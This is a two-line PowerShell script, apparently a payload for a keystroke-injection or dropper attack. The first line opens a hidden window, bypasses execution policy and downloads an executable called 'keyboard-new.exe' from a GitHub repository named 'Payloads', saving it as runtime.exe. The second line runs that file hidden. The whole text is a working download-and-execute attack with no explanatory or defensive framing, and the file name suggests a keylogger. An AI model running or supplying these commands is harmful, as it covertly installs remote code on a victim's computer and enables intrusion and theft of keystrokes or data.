powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/keyboard-new.exe -o C:\Users\runtime.exe
powershell.exe -w Hidden C:\Users\runtime.exe
